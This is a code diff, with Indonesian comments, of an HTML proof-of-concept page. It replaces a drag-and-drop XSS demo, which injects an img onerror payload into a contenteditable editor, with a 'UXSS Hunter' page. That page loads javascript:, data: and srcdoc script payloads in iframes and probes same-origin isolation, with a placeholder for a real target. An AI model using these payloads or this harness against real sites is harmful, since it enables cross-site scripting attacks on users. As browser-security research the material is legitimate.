@@ -1,57 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Drag & Drop XSS PoC</title>
+  <title>UXSS Hunter</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 20px; }
-    #dragme {
-      width: 150px; padding: 15px;
-      background: #ff5722; color: white;
-      cursor: grab; user-select: none;
-      text-align: center; border-radius: 8px;
-    }
-    #editor {
-      width: 90%; height: 200px;
-      border: 2px dashed #aaa; margin-top: 40px;
-      padding: 10px; font-size: 16px;
-    }
+    body { font-family: monospace; background: #111; color: #0f0; }
+    iframe { width: 400px; height: 200px; border: 1px solid #555; margin: 5px; }
+    .log { white-space: pre; }
   </style>
 </head>
 <body>
-  <h2>Drag & Drop XSS PoC</h2>
-  <p>👉 Drag kotak oranye ini lalu drop ke editor di bawah</p>
-
-  <div id="dragme" draggable="true">🔥 Drag Me</div>
-
-  <h3>Target WYSIWYG (contenteditable)</h3>
-  <div id="editor" contenteditable="true">
-    Drop here...
-  </div>
+  <h2>🕵️ UXSS Hunter PoC</h2>
+  <div class="log" id="log"></div>
 
   <script>
-    const dragme = document.getElementById("dragme");
-    const editor = document.getElementById("editor");
+    function log(msg) {
+      document.getElementById("log").textContent += msg + "\n";
+      console.log(msg);
+    }
 
-    dragme.addEventListener("dragstart", e => {
-      // Payload XSS
-      const payload = `<img src=x onerror="alert('XSS via Drag&Drop!')">`;
-      console.log("Dragging payload:", payload);
+    // Target list buat fuzz
+    const targets = [
+      "https://example.com",             // ganti ke target asli
+      "about:blank",
+      "data:text/html,<script>alert(document.domain)</script>",
+      "javascript:alert(document.domain)"
+    ];
 
-      // Inject payload ke DataTransfer
-      e.dataTransfer.setData("text/html", payload);
-      e.dataTransfer.effectAllowed = "copy";
+    // Coba load target dalam iframe
+    targets.forEach(url => {
+      try {
+        let f = document.createElement("iframe");
+        f.src = url;
+        document.body.appendChild(f);
+
+        log("Loaded: " + url);
+
+        // Coba akses contentWindow (harusnya diblok Same-Origin Policy)
+        setTimeout(() => {
+          try {
+            let dom = f.contentWindow.document;
+            log("❗ [Possible UXSS] bisa akses DOM iframe: " + url + " → domain: " + dom.domain);
+          } catch(e) {
+            log("✅ [Isolated] ga bisa akses iframe: " + url);
+          }
+        }, 2000);
+
+      } catch(e) {
+        log("Error load: " + url + " → " + e);
+      }
     });
 
-    // Biar bisa drop
-    editor.addEventListener("dragover", e => e.preventDefault());
+    // Tes srcdoc injection
+    let s = document.createElement("iframe");
+    s.srcdoc = "<script>parent.postMessage('[srcdoc executed] domain='+document.domain,'*')</script>";
+    document.body.appendChild(s);
 
-    editor.addEventListener("drop", e => {
-      e.preventDefault();
-      // Ambil payload dari drag data
-      const data = e.dataTransfer.getData("text/html");
-      console.log("Dropped:", data);
-      // Insert raw HTML → trigger XSS
-      editor.insertAdjacentHTML("beforeend", data);
+    window.addEventListener("message", (e) => {
+      log("📩 Message dari iframe: " + e.data);
     });
   </script>
 </body>
